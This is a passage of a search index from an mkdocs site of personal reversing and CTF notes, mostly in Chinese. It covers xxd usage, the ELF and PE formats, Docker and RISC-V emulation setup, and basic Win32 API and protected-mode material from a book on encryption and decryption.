{
    "docs": [
        {
            "location": "/", 
            "text": "Welcome to 0Xor' WriteUp\n\n\nMy personal ctf and sec writeups.\n\n\nCommands\n\n\n\n\nmkdocs new [dir-name]\n - Create a new project.\n\n\nmkdocs serve\n - Start the live-reloading docs server.\n\n\nmkdocs build\n - Build the documentation site.\n\n\nmkdocs help\n - Print this help message.\n\n\n\n\nProject layout\n\n\nmkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.", 
            "title": "Welcome to 0Xor' WriteUp"
        }, 
        {
            "location": "/#welcome-to-0xor-writeup", 
            "text": "My personal ctf and sec writeups.", 
            "title": "Welcome to 0Xor' WriteUp"
        }, 
        {
            "location": "/#commands", 
            "text": "mkdocs new [dir-name]  - Create a new project.  mkdocs serve  - Start the live-reloading docs server.  mkdocs build  - Build the documentation site.  mkdocs help  - Print this help message.", 
            "title": "Commands"
        }, 
        {
            "location": "/#project-layout", 
            "text": "mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.", 
            "title": "Project layout"
        }, 
        {
            "location": "/reversing/Moblie/", 
            "text": "Moblie\n\n\n0x01 tools\n\n\n0x1 EJB\n\n\n技巧\n\n\n\n\n查看源代码：右键-\n Decomplier(Q)\n\n\n\n\n0x2 android killer\n\n\n0x3 夜神模拟器", 
            "title": "Moblie"
        }, 
        {
            "location": "/reversing/Moblie/#moblie", 
            "text": "", 
            "title": "Moblie"
        }, 
        {
            "location": "/reversing/Moblie/#0x01-tools", 
            "text": "", 
            "title": "0x01 tools"
        }, 
        {
            "location": "/reversing/Moblie/#0x1-ejb", 
            "text": "", 
            "title": "0x1 EJB"
        }, 
        {
            "location": "/reversing/Moblie/#_1", 
            "text": "查看源代码：右键-  Decomplier(Q)", 
            "title": "技巧"
        }, 
        {
            "location": "/reversing/Moblie/#0x2-android-killer", 
            "text": "", 
            "title": "0x2 android killer"
        }, 
        {
            "location": "/reversing/Moblie/#0x3", 
            "text": "", 
            "title": "0x3 夜神模拟器"
        }, 
        {
            "location": "/reversing/reversing misc/", 
            "text": "reversing misc\n\n\n0x01 hex文件转换\n\n\n0x1 xxd\n\n\nxxd [options] [infile [outfile]]\nxxd -r[evert] [options] [infile [outfile]]\n\n\n\n\n\n\n功能\n\n\n\n\nxxd 命令用于用二进制或十六进制显示文件的内容，如果没有指定outfile参数，则把结果显示在屏幕上，如果指定了outfile则把结果输出到 outfile中；如果infile参数为 – ，或没有指定infile参数，则默认从标准输入读入。\n\n\n\n\n常用选项\n\n\n\n\n-b\n\n\n\n\n转到 比特(二进制 数字) 模式, 而不是十六进制模式。在这种模式下, 每个字符被表示成八个 0/1 的数字，而不是一般的十六进制形式。每一行都以一个用十六进制形式表示的行号，后面是ascii (或者 ebcdic) 形式开头。命令行选项 -r, -p 在这个模式下不起作用。\n\n\n\n\n-l N\n\n\n只输出 N 个字符。\n\n\n-p\n\n\n以 postscript的连续十六进制转储输出，这也叫做纯十六进制转储。\n\n\n-r\n\n\n\n\n逆向操作: 把xxd的十六进制输出内容转换回原文件的二进制内容。\n\n\n\n\n-seek offset\n\n\n\n\n用在 -r 之后: 会在当前档桉的 偏移量上增加 .\n\n\n\n\n-s [+][-]seek\n\n\n\n\n从infile的绝对或者相对偏移量 开始. + 表示相对于标 输入当前的位置 (如果不 标准输入就没有意义了). – 表示\n从档桉末尾\n (如果和 + 连用: 从标准输入当前位置) 向前数一些字符, 从那个地方开始. 如果没有 -s 选项, xxd 从 当前位置开始.\n\n\n\n\n-u\n\n\n十六进制输出时使用大写字母，默认是小写字母。\n\n\n使用范例：(摘自xxd man page)\n\n\n\n\n显示 file 除了前 三行 (十六进制 的 0×30) 的 所有 内容.\n\n\n\n\n$ xxd -s 0×30 file\n\n\n\n\n\n\n显示 file 最后 三行 (十六进制 的 0×30) 的 所有 内容.\n\n\n\n\n$ xxd -s -0×30 file\n\n\n\n\n\n\n显示 120 个 字符, 每行 20 个 字符, 连续 显示.\n\n\n\n\n$ xxd -l 120 -ps -c 20 xxd.1\n\n\n\n\n\n\n2e544820585844203120224d616e75616c207061\n676520666f7220787864220a2e5c220a2e5c2220\n32317374204d617920313939360a2e5c22204d61\n6e207061676520617574686f723a0a2e5c222020\n2020546f6e79204e7567656e74203c746f6e7940\n7363746e7567656e2e7070702e67752e6564752e\n\n\n\n\n\n\n显示 120 个 字符, 每行 12 个 字符.\n\n\n\n\n$ xxd -l 120 -c 12 xxd.1\n\n\n\n\n\n\n0000000: 2e54 4820 5858 4420 3120 224d .TH XXD 1 “M\n000000c: 616e 7561 6c20 7061 6765 2066 anual page f\n0000018: 6f72 2078 7864 220a 2e5c 220a or xxd”..\\”.\n0000024: 2e5c 2220 3231 7374 204d 6179 .\\” 21st May\n0000030: 2031 3939 360a 2e5c 2220 4d61 1996..\\” Ma\n000003c: 6e20 7061 6765 2061 7574 686f n page autho\n0000048: 723a 0a2e 5c22 2020 2020 546f r:..\\” To\n0000054: 6e79 204e 7567 656e 7420 3c74 ny Nugent \n0000060: 6f6e 7940 7363 746e 7567 656e ony@sctnugen\n000006c: 2e70 7070 2e67 752e 6564 752e .ppp.gu.edu.\n\n\n\n\n\n\n只 显示 xxd.1 中 的 日期.\n\n\n\n\n$ xxd -s 0×28 -l 12 -c 12 xxd.1\n\n\n\n\n\n\n0000028: 3231 7374 204d 6179 2031 3939 21st May 199\n\n\n\n\n\n\n把 input_file 考到 output_file 并 在 前面 增加 100 个 字节的 0×00.\n\n\n\n\n$ xxd input_file | xxd -r -s 100 \n output_file\n\n\n\n\n\n\n给 档桉 xxd.1 中的 日期 打 补钉.\n\n\n\n\n$ echo ‘0000029: 3574 68′ | xxd -r – xxd.1\n\n$ xxd -s 0×28 -l 12 -c 12 xxd.1\n\n\n\n\n\n\n0000028: 3235 7468 204d 6179 2031 3939 25th May 199\n\n\n\n\n\n\n建立 一个 65537 字节的 档桉, 所有 字节 都是 0×00, 除了 最后 一个 字节 是 ‘A’ (十六进制 0×41).\n\n\n\n\n$ echo ‘010000: 41′ | xxd -r \n file\n\n\n\n\n\n\n打开 autoskip, 显示 上例 中 建立的 档桉.\n\n\n\n\n$ xxd -a -c 12 file\n\n\n\n\n\n\n0000000: 0000 0000 0000 0000 0000 0000 …………\n*\n000fffc: 0000 0000 40 ….A\n\n\n\n\n\n\n建立 一个 只 含有 一个 ‘A’ 的 档桉. ‘-r -s’ 后面 的数字 同 档桉 中的 行号 相 抵消; 结果是 开头 的 字节 被跳过了.\n\n\n\n\n$ echo ‘010000: 41′ | xxd -r -s -0×10000 \n file\n\n\n\n\n\n\n从 串行线 中 读入 一个个的 单独的 字符.\n\n\n\n\n$ xxd -c1 \n /dev/term/b \n\n\n$ stty \n /dev/term/b -echo -opost -isig -icanon min 1\n\n$ echo -n foo \n /dev/term/b\n\n\n\n\n\n0x03 系统辨认\n\n\n0x01 EFI格式\n\n\n\n\n\n\n参考链接：https://www.ibm.com/developerworks/cn/linux/l-excutff/index.html\n\n\n\n\n\n\n文件格式\n\n\n\n\n\n\n二进制文件\n\n\n\n\n可执行文件\n\n\n目标代码\n\n\n共享库\n\n\n\n\n核心转储格式\n\n\n\n\n\n\nELF组成\n\n\n\n\n\n\nELF文件的总体布局：\n\n\n\n\n\n\n\n\n\n\n\n\nELF header(ELF头部)\n\n\n\n\n\n\n\n\n\n\nProgram header table(程序头表)\n\n\n\n\n\n\nSegment1（段1）\n\n\n\n\n\n\nSegment2（段2）\n\n\n\n\n\n\n………\n\n\n\n\n\n\nSengmentn（段n）\n\n\n\n\n\n\nSetion header table(节头表，可选)\n\n\n\n\n\n\n\n\n只有ELF的头部是固定的，其余部分都有头部参数指定\n\n\n\n\n\n\nELF文件含义\n\n\nc\n typedef struct\n {\n         unsigned char e_ident[EI_NIDENT];     /* 魔数和相关信息 */\n         Elf32_Half    e_type;                 /* 目标文件类型 */\n         Elf32_Half    e_machine;              /* 硬件体系 */\n         Elf32_Word    e_version;              /* 目标文件版本 */\n         Elf32_Addr    e_entry;                /* 程序进入点 */\n         Elf32_Off     e_phoff;                /* 程序头部偏移量 */\n         Elf32_Off     e_shoff;                /* 节头部偏移量 */\n         Elf32_Word    e_flags;                /* 处理器特定标志 */\n         Elf32_Half    e_ehsize;               /* ELF头部长度 */\n         Elf32_Half    e_phentsize;            /* 程序头部中一个条目的长度 */\n         Elf32_Half    e_phnum;                /* 程序头部条目个数  */\n         Elf32_Half    e_shentsize;            /* 节头部中一个条目的长度 */\n         Elf32_Half    e_shnum;                /* 节头部条目个数 */\n         Elf32_Half    e_shstrndx;             /* 节头部字符表索引 */\n } Elf32_Ehdr;\n\n\n\n\n\n\n识别文件格式\n\n\n\n\n\n\nfile\n:识别处文件的基本格式\n\n\nreadelf\n:如果无法运行，则需要具体查看文件头信息\n\n\nshell\n   readelf 文件名\n\n\n0x04 docker使用\n\n\n0x01 service-start-limit-hit报错\n\n\n\n\njson\n{\n    \"registry-mirrors\": [\n        \"加速地址\"\n    ],\n    \"insecure-registries\": []\n}\n\n\n\n\n加速需要加上外面的\n\"\n,否则就会报错\n\n\n0x02 Docker 国内镜像\n\n\n网易加速器：http://hub-mirror.c.163.com\n\n\n官方中国加速器：https://registry.docker-cn.com\n\n\nustc的镜像：https://docker.mirrors.ustc.edu.cn\n\n\ndaocloud：https://www.daocloud.io/mirror#accelerator-doc（注册后使用）\n\n\n0x03 risc-v虚拟环境搭建\n\n\ndocker run --privileged -v /home:/home -it sorear/fedora-riscv-wipv\n\n\n\n\n0x04 安装出错\n\n\n\n\nFATAL: kernel too old\n\n\nStarting architecture emulation failed.  binfmt_misc configuration requires\ntrue root privileges, and is not effective in sandboxed root environments\nsuch as is provided by Docker by default. You will need to run the following\ncommand as root on the Docker host machine:\n\n\nshell\n echo ':riscv64:M::\\x7f\\x45\\x4c\\x46\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\x00:\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff:/usr/bin/qemu-riscv64:' \n /proc/sys/fs/binfmt_misc/register\n\n\nIt is also possible to run this container with --privileged; this might be\nuseful for Docker on Mac or Docker on Windows.\n\n\n\n\n解决办法未知", 
            "title": "reversing misc"
        }, 
        {
            "location": "/reversing/reversing misc/#reversing-misc", 
            "text": "", 
            "title": "reversing misc"
        }, 
        {
            "location": "/reversing/reversing misc/#0x01-hex", 
            "text": "", 
            "title": "0x01 hex文件转换"
        }, 
        {
            "location": "/reversing/reversing misc/#0x1-xxd", 
            "text": "xxd [options] [infile [outfile]]\nxxd -r[evert] [options] [infile [outfile]]   功能   xxd 命令用于用二进制或十六进制显示文件的内容，如果没有指定outfile参数，则把结果显示在屏幕上，如果指定了outfile则把结果输出到 outfile中；如果infile参数为 – ，或没有指定infile参数，则默认从标准输入读入。   常用选项   -b   转到 比特(二进制 数字) 模式, 而不是十六进制模式。在这种模式下, 每个字符被表示成八个 0/1 的数字，而不是一般的十六进制形式。每一行都以一个用十六进制形式表示的行号，后面是ascii (或者 ebcdic) 形式开头。命令行选项 -r, -p 在这个模式下不起作用。   -l N  只输出 N 个字符。  -p  以 postscript的连续十六进制转储输出，这也叫做纯十六进制转储。  -r   逆向操作: 把xxd的十六进制输出内容转换回原文件的二进制内容。   -seek offset   用在 -r 之后: 会在当前档桉的 偏移量上增加 .   -s [+][-]seek   从infile的绝对或者相对偏移量 开始. + 表示相对于标 输入当前的位置 (如果不 标准输入就没有意义了). – 表示 从档桉末尾  (如果和 + 连用: 从标准输入当前位置) 向前数一些字符, 从那个地方开始. 如果没有 -s 选项, xxd 从 当前位置开始.   -u  十六进制输出时使用大写字母，默认是小写字母。  使用范例：(摘自xxd man page)   显示 file 除了前 三行 (十六进制 的 0×30) 的 所有 内容.   $ xxd -s 0×30 file   显示 file 最后 三行 (十六进制 的 0×30) 的 所有 内容.   $ xxd -s -0×30 file   显示 120 个 字符, 每行 20 个 字符, 连续 显示.   $ xxd -l 120 -ps -c 20 xxd.1   2e544820585844203120224d616e75616c207061\n676520666f7220787864220a2e5c220a2e5c2220\n32317374204d617920313939360a2e5c22204d61\n6e207061676520617574686f723a0a2e5c222020\n2020546f6e79204e7567656e74203c746f6e7940\n7363746e7567656e2e7070702e67752e6564752e    显示 120 个 字符, 每行 12 个 字符.   $ xxd -l 120 -c 12 xxd.1   0000000: 2e54 4820 5858 4420 3120 224d .TH XXD 1 “M\n000000c: 616e 7561 6c20 7061 6765 2066 anual page f\n0000018: 6f72 2078 7864 220a 2e5c 220a or xxd”..\\”.\n0000024: 2e5c 2220 3231 7374 204d 6179 .\\” 21st May\n0000030: 2031 3939 360a 2e5c 2220 4d61 1996..\\” Ma\n000003c: 6e20 7061 6765 2061 7574 686f n page autho\n0000048: 723a 0a2e 5c22 2020 2020 546f r:..\\” To\n0000054: 6e79 204e 7567 656e 7420 3c74 ny Nugent \n0000060: 6f6e 7940 7363 746e 7567 656e ony@sctnugen\n000006c: 2e70 7070 2e67 752e 6564 752e .ppp.gu.edu.    只 显示 xxd.1 中 的 日期.   $ xxd -s 0×28 -l 12 -c 12 xxd.1   0000028: 3231 7374 204d 6179 2031 3939 21st May 199    把 input_file 考到 output_file 并 在 前面 增加 100 个 字节的 0×00.   $ xxd input_file | xxd -r -s 100   output_file   给 档桉 xxd.1 中的 日期 打 补钉.   $ echo ‘0000029: 3574 68′ | xxd -r – xxd.1\n\n$ xxd -s 0×28 -l 12 -c 12 xxd.1   0000028: 3235 7468 204d 6179 2031 3939 25th May 199    建立 一个 65537 字节的 档桉, 所有 字节 都是 0×00, 除了 最后 一个 字节 是 ‘A’ (十六进制 0×41).   $ echo ‘010000: 41′ | xxd -r   file   打开 autoskip, 显示 上例 中 建立的 档桉.   $ xxd -a -c 12 file   0000000: 0000 0000 0000 0000 0000 0000 …………\n*\n000fffc: 0000 0000 40 ….A    建立 一个 只 含有 一个 ‘A’ 的 档桉. ‘-r -s’ 后面 的数字 同 档桉 中的 行号 相 抵消; 结果是 开头 的 字节 被跳过了.   $ echo ‘010000: 41′ | xxd -r -s -0×10000   file   从 串行线 中 读入 一个个的 单独的 字符.   $ xxd -c1   /dev/term/b  \n\n$ stty   /dev/term/b -echo -opost -isig -icanon min 1\n\n$ echo -n foo   /dev/term/b", 
            "title": "0x1 xxd"
        }, 
        {
            "location": "/reversing/reversing misc/#0x03", 
            "text": "", 
            "title": "0x03 系统辨认"
        }, 
        {
            "location": "/reversing/reversing misc/#0x01-efi", 
            "text": "参考链接：https://www.ibm.com/developerworks/cn/linux/l-excutff/index.html    文件格式    二进制文件   可执行文件  目标代码  共享库   核心转储格式    ELF组成    ELF文件的总体布局：       ELF header(ELF头部)      Program header table(程序头表)    Segment1（段1）    Segment2（段2）    ………    Sengmentn（段n）    Setion header table(节头表，可选)     只有ELF的头部是固定的，其余部分都有头部参数指定    ELF文件含义  c\n typedef struct\n {\n         unsigned char e_ident[EI_NIDENT];     /* 魔数和相关信息 */\n         Elf32_Half    e_type;                 /* 目标文件类型 */\n         Elf32_Half    e_machine;              /* 硬件体系 */\n         Elf32_Word    e_version;              /* 目标文件版本 */\n         Elf32_Addr    e_entry;                /* 程序进入点 */\n         Elf32_Off     e_phoff;                /* 程序头部偏移量 */\n         Elf32_Off     e_shoff;                /* 节头部偏移量 */\n         Elf32_Word    e_flags;                /* 处理器特定标志 */\n         Elf32_Half    e_ehsize;               /* ELF头部长度 */\n         Elf32_Half    e_phentsize;            /* 程序头部中一个条目的长度 */\n         Elf32_Half    e_phnum;                /* 程序头部条目个数  */\n         Elf32_Half    e_shentsize;            /* 节头部中一个条目的长度 */\n         Elf32_Half    e_shnum;                /* 节头部条目个数 */\n         Elf32_Half    e_shstrndx;             /* 节头部字符表索引 */\n } Elf32_Ehdr;    识别文件格式    file :识别处文件的基本格式  readelf :如果无法运行，则需要具体查看文件头信息  shell\n   readelf 文件名", 
            "title": "0x01 EFI格式"
        }, 
        {
            "location": "/reversing/reversing misc/#0x04-docker", 
            "text": "", 
            "title": "0x04 docker使用"
        }, 
        {
            "location": "/reversing/reversing misc/#0x01-service-start-limit-hit", 
            "text": "json\n{\n    \"registry-mirrors\": [\n        \"加速地址\"\n    ],\n    \"insecure-registries\": []\n}   加速需要加上外面的 \" ,否则就会报错", 
            "title": "0x01 service-start-limit-hit报错"
        }, 
        {
            "location": "/reversing/reversing misc/#0x02-docker", 
            "text": "网易加速器：http://hub-mirror.c.163.com  官方中国加速器：https://registry.docker-cn.com  ustc的镜像：https://docker.mirrors.ustc.edu.cn  daocloud：https://www.daocloud.io/mirror#accelerator-doc（注册后使用）", 
            "title": "0x02 Docker 国内镜像"
        }, 
        {
            "location": "/reversing/reversing misc/#0x03-risc-v", 
            "text": "docker run --privileged -v /home:/home -it sorear/fedora-riscv-wipv", 
            "title": "0x03 risc-v虚拟环境搭建"
        }, 
        {
            "location": "/reversing/reversing misc/#0x04", 
            "text": "FATAL: kernel too old  Starting architecture emulation failed.  binfmt_misc configuration requires\ntrue root privileges, and is not effective in sandboxed root environments\nsuch as is provided by Docker by default. You will need to run the following\ncommand as root on the Docker host machine:  shell\n echo ':riscv64:M::\\x7f\\x45\\x4c\\x46\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\x00:\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xff\\xff:/usr/bin/qemu-riscv64:'   /proc/sys/fs/binfmt_misc/register  It is also possible to run this container with --privileged; this might be\nuseful for Docker on Mac or Docker on Windows.   解决办法未知", 
            "title": "0x04 安装出错"
        }, 
        {
            "location": "/reversing/encrypt&decrypt/加密与解密 第一章-基础知识/", 
            "text": "加密与解密 第一篇 基础篇\n\n\n第一章 基础知识\n\n\n1.1 文本字符\n\n\n1.1.1 字节存储顺序\n\n\n\n\nLittle-Encoding :Intel体系芯片\n\n\n\n\n高字节存入低地址，低字节存入高地址\n\n\n\n\nBig-Encoding：RSIC架构CPU\n\n\n\n\n高字节存入高地址，低字节存入低地址\n\n\n1.1.2 ASCII与UNICODE编码\n\n\n\n\nASCII\n\n\n\n\n\n\n\n\n\n\nASCII值\n\n\n控制字符\n\n\nASCII值\n\n\n控制字符\n\n\nASCII值\n\n\n控制字符\n\n\nASCII值\n\n\n控制字符\n\n\n\n\n\n\n\n\n\n\n0\n\n\nNUT\n\n\n32\n\n\n(space)\n\n\n64\n\n\n@\n\n\n96\n\n\n、\n\n\n\n\n\n\n1\n\n\nSOH\n\n\n33\n\n\n!\n\n\n65\n\n\nA\n\n\n97\n\n\na\n\n\n\n\n\n\n2\n\n\nSTX\n\n\n34\n\n\n\"\n\n\n66\n\n\nB\n\n\n98\n\n\nb\n\n\n\n\n\n\n3\n\n\nETX\n\n\n35\n\n\n#\n\n\n67\n\n\nC\n\n\n99\n\n\nc\n\n\n\n\n\n\n4\n\n\nEOT\n\n\n36\n\n\n$\n\n\n68\n\n\nD\n\n\n100\n\n\nd\n\n\n\n\n\n\n5\n\n\nENQ\n\n\n37\n\n\n%\n\n\n69\n\n\nE\n\n\n101\n\n\ne\n\n\n\n\n\n\n6\n\n\nACK\n\n\n38\n\n\n\n\n70\n\n\nF\n\n\n102\n\n\nf\n\n\n\n\n\n\n7\n\n\nBEL\n\n\n39\n\n\n,\n\n\n71\n\n\nG\n\n\n103\n\n\ng\n\n\n\n\n\n\n8\n\n\nBS\n\n\n40\n\n\n(\n\n\n72\n\n\nH\n\n\n104\n\n\nh\n\n\n\n\n\n\n9\n\n\nHT\n\n\n41\n\n\n)\n\n\n73\n\n\nI\n\n\n105\n\n\ni\n\n\n\n\n\n\n10\n\n\nLF\n\n\n42\n\n\n*\n\n\n74\n\n\nJ\n\n\n106\n\n\nj\n\n\n\n\n\n\n11\n\n\nVT\n\n\n43\n\n\n+\n\n\n75\n\n\nK\n\n\n107\n\n\nk\n\n\n\n\n\n\n12\n\n\nFF\n\n\n44\n\n\n,\n\n\n76\n\n\nL\n\n\n108\n\n\nl\n\n\n\n\n\n\n13\n\n\nCR\n\n\n45\n\n\n-\n\n\n77\n\n\nM\n\n\n109\n\n\nm\n\n\n\n\n\n\n14\n\n\nSO\n\n\n46\n\n\n.\n\n\n78\n\n\nN\n\n\n110\n\n\nn\n\n\n\n\n\n\n15\n\n\nSI\n\n\n47\n\n\n/\n\n\n79\n\n\nO\n\n\n111\n\n\no\n\n\n\n\n\n\n16\n\n\nDLE\n\n\n48\n\n\n0\n\n\n80\n\n\nP\n\n\n112\n\n\np\n\n\n\n\n\n\n17\n\n\nDCI\n\n\n49\n\n\n1\n\n\n81\n\n\nQ\n\n\n113\n\n\nq\n\n\n\n\n\n\n18\n\n\nDC2\n\n\n50\n\n\n2\n\n\n82\n\n\nR\n\n\n114\n\n\nr\n\n\n\n\n\n\n19\n\n\nDC3\n\n\n51\n\n\n3\n\n\n83\n\n\nS\n\n\n115\n\n\ns\n\n\n\n\n\n\n20\n\n\nDC4\n\n\n52\n\n\n4\n\n\n84\n\n\nT\n\n\n116\n\n\nt\n\n\n\n\n\n\n21\n\n\nNAK\n\n\n53\n\n\n5\n\n\n85\n\n\nU\n\n\n117\n\n\nu\n\n\n\n\n\n\n22\n\n\nSYN\n\n\n54\n\n\n6\n\n\n86\n\n\nV\n\n\n118\n\n\nv\n\n\n\n\n\n\n23\n\n\nTB\n\n\n55\n\n\n7\n\n\n87\n\n\nW\n\n\n119\n\n\nw\n\n\n\n\n\n\n24\n\n\nCAN\n\n\n56\n\n\n8\n\n\n88\n\n\nX\n\n\n120\n\n\nx\n\n\n\n\n\n\n25\n\n\nEM\n\n\n57\n\n\n9\n\n\n89\n\n\nY\n\n\n121\n\n\ny\n\n\n\n\n\n\n26\n\n\nSUB\n\n\n58\n\n\n:\n\n\n90\n\n\nZ\n\n\n122\n\n\nz\n\n\n\n\n\n\n27\n\n\nESC\n\n\n59\n\n\n;\n\n\n91\n\n\n[\n\n\n123\n\n\n{\n\n\n\n\n\n\n28\n\n\nFS\n\n\n60\n\n\n\n\n92\n\n\n/\n\n\n124\n\n\n|\n\n\n\n\n\n\n29\n\n\nGS\n\n\n61\n\n\n=\n\n\n93\n\n\n]\n\n\n125\n\n\n}\n\n\n\n\n\n\n30\n\n\nRS\n\n\n62\n\n\n\n\n94\n\n\n^\n\n\n126\n\n\n`\n\n\n\n\n\n\n31\n\n\nUS\n\n\n63\n\n\n?\n\n\n95\n\n\n_\n\n\n127\n\n\nDEL\n\n\n\n\n\n\n\n\n\n\nunicode\n\n\n\n\n所有字符都是16位\n\n\n1.2 操作系统\n\n\n1.2.1 win api\n\n\n\n\n\n\n动态链接库\n\n\n\n\n\n\nKernel\n\n\n核心功能\n\n\n\n\n进程线程\n\n\n内存管理\n\n\n文件访问\n\n\n\n\n\n\n\n\nUser\n\n\n用户接口\n\n\n\n\n键盘和鼠标输入\n\n\n窗口和菜单管理\n\n\n\n\n\n\n\n\nGDI\n\n\n图形设备接口\n\n\n\n\n屏幕和打印机显示文本和图像\n\n\n\n\n\n\n\n\n1.2.2 常用win32 api 函数\n\n\nhmemcpy\n\n\n\n\n\n\n这是一个Win16 API函数，位于位的KRNL386.EXE链接库里。是系统底层的东西，没有特殊需要，一般不直接调用\n\n\n\n\n\n\n功能：执行的操作很简单，只是将内存中的一块数据COPY到另一个地方\n\n\n\n\n\n\n在Windows 9x中，Win32函数调用通过转换层转换为Win16函数调用，所以Windows 9x底层频繁的调用hmemcpy这个位的函数来拷贝数据\n\n\n\n\n\n\n它经常被解密者作为断点拦截数据，别称“万能断点”\n\n\n\n\n\n\nc\n  void hmemcpy(\n    void _huge *hpvDest,            //目地数据地址\n    const void _huge *hpvSource,    //源数据地址\n    long cbCopyn                    //数据大小\n  );\n\n\nGetWindowText\n\n\n\n\n\n\n此函数在USER32.DLL用户模块中，它的作用是取得一个窗体的标题文字，或者一个文本控件的内容\n\n\n\n\n\n\n如果成功返回文本长度;失败则返回零值\n\n\n\n\n\n\nANSI版是GetWindowTextA  Unicode版是GetWindowTextW\n\n\n\n\n\n\n```c\n  int GetWindowText(\n    HWND hWnd,              //窗口或文件空间句柄\n    LPTSTR lpString,        //缓冲区地址\n    int nMaxCount           //复制的最大字符数\n                   );\n\n\n```\n\n\nGetDlgItem\n\n\n\n\n此函数在USER32.DLL用户模块中，它的作用是获取指定对话框的句柄\n\n\n如果成功返回对话框的句柄；失败则返回零\n\n\n\n\nHWND GetDlgItem(\n\n    HWND hDlg,                 //对话框句柄\n\n    int nIDDlgItem             //控件标识\n                  );\n\n\n\n\nGetDlgItemText\n\n\n\n\n此函数在USER32.DLL用户模块中，它的作用是获取对话框文本\n\n\n如果成功返回文本长度；失败则返回零\n\n\nANSI版是GetDlgItemTextA  Unicode版是GetDlgItemTextW\n\n\n\n\nUINT GetDlgItemText(\n\n    HWND hDlg,                 //对话框句柄      \n\n    int nIDDlgItem,            //空间标识(ID号)\n\n    LPTSTR lpString,       //文本缓冲区指针\n\n    int nMaxCount         //字符缓冲区的长度\n\n                          );\n\n\n\n\nGetDlgItemInt\n\n\n\n\n此函数在USER32.DLL用户模块中，它的作用是获取对话框整数值\n\n\n如果成功，lpTranslated被设置为TRUE\n\n\n\n\nUINT GetDlgItemInt(\n\n    HWND hDlg,                 //对话框句柄\n\n    int nIDDlgItem,            //空间标识\n\n    BOOL *lpTranslated,        //接受成功/失败指示的指针\n\n    BOOL bSigned          //指定是有符号数还是无符号数\n\n                     )\n\n\n\n\nMessageBox\n\n\n\n\n此函数在USER32.DLL用户模块中，创建和显示信息框\n\n\nANSI版是MessageBoxA  Unicode版是MessageBoxW\n\n\n\n\nint MessageBox(\n\n    HWND hDlg,                 //父窗口句柄\n\n    LPCTSTR lpText,            //消息框文本地址\n\n    LPCTSTR lpCaption,     //消息框标题地址\n\n    UINT uType                 //消息框样式\n\n                );\n\n\n\n\nGetDlgItemText\n\n\n\n\n是根据控件ID来取文字，GetWindowText是根据控件句柄或者指针来取\n\n\n\n\n1.2.3 什么是句柄\n\n\n\n\nwindows标识\n\n\n由应用程序建立或使用的对象所使用的唯一的整数值（32位）\n\n\n\n\n1.2.4 windows 9.x 和unicode\n\n\n\n\n大部分的32位函数只是调用了16位版本\n\n\n有少量的unicode版本的函数\n\n\nMessageBox\n\n\n大部分的函数只有unicode的参数进入点，但其实并不将unicode码转成ascii，而是直接返回失败的消息\n\n\n\n\n1.2.5 windows NT/2000/XP 与unicode\n\n\n\n\n内核只使用unicode\n\n\n\n\n1.2.6 windows消息机制\n\n\n\n\n\n\nwindows应用程序之间、应用程序与windows系统之间的进行通信的手段\n\n\n\n\n\n\n两个队列\n\n\n\n\n\n\n系统消息队列\n\n\n\n\n应用程序消息队列\n\n\n\n\n按消息到达的先后进行处理\n\n\n\n\n\n\n常用windows消息函数\n\n\n\n\n\n\nSendMessage\n\n\n\n\n\n\n将一条消息发送给某个函数\n\n\n\n\n返回值\n\n\nWM_COMMAND\n\n\n用户从菜单或者按钮选择一条命令或者一个控件，发送给其父窗口\n\n\n或者一个快捷键被释放时\n\n\n应用程序处理这条消息，则返回0\n\n\nWM_DESTORY\n\n\n一个窗口被破坏时发送\n\n\nWM_GETTEXT\n\n\n将程序提供的文本拷贝到一个呼叫程序提供的缓冲区\n\n\nWM_QUIT\n\n\n当应用程序调用PostQuitMessage函数\n\n\nWM_LEFTBUTTONDOWN\n\n\n光标在一个窗口的客户区，用户按下了鼠标左键\n\n\n未被捕获，就发送给光标下的窗口\n\n\n\n\n\n\n\n\n1.3 保护模式\n\n\n\n\n模式\n\n\n实模式\n\n\n保护模式\n\n\n虚拟x86模式\n\n\n\n\n1.3.1 虚拟内存\n\n\n\n\n实模式\n\n\n寻址方式：段基址+段偏移\n\n\n段大小：64K\n\n\n所有段可读写，只有代码段可执行\n\n\n保护模式\n\n\n段选择子+段偏移\n\n\n段选择子：不参与选址，只是GDT或者LDT的指针\n\n\n不同的段寄存器有不同的属性\n\n\n读\n\n\n写\n\n\n执行\n\n\n特选级\n\n\n\n\n\n\nwin32平坦内存模式\n\n\n每个进程有自己的虚拟空间，32位进程位4GB\n\n\n程序的代码不区分代码段和数据段\n\n\n4GB中，2GB给应用程序（也可达到3G），2GB给操作系统\n\n\n操作系统和系统DLL所有时间片都必须映射\n\n\n用户exe只在属于自己的时间片映射\n\n\n用户DLL有选择的映射\n\n\n虚拟内存的实现方法：\n\n\n程序启动，分配2GB虚拟地址\n\n\n应用程序代码映射到虚拟内存某个位置\n\n\n使用了DLL，则也映射该DLL\n\n\n数据、堆栈等也进行映射\n\n\n程序从虚拟地址执行\n\n\n\n\n\n\n\n\n1.3.2 保护模式的权限级别\n\n\n\n\n权限级别\n\n\n\n\n4个等级：0，1，2，3\n\n\n\n\n\n\n0级\n\n\n\n\n\n\n执行所有指令、访问所有数据\n\n\n\n\n操作系统核心层运行在0级\n\n\nhal.dll（硬件抽象层）\n\n\n\n\nntoskrnl.exe的上层\n\n\n\n\n\n\n3级\n\n\n\n\n\n\n指令有限、数据有限\n\n\n\n\n\n\nwin32子系统运行在3级\n\n\n\n\nkernel.dll\n\n\nuser32.dll\n\n\ngdi32.dll\n\n\n\n\n\n\n\n\nntdll.dll\n\n\n用户层导出并且可以调用的函数接口\n\n\n\n\n\n\n用户的应用程序\n\n\n\n\n\n\n1.4 PE格式\n\n\n区块\n\n\n\n\n.txt 全部指令代码\n\n\n.rdata 运行期的只读数据\n\n\n.data 初始化数据块\n\n\n.idata 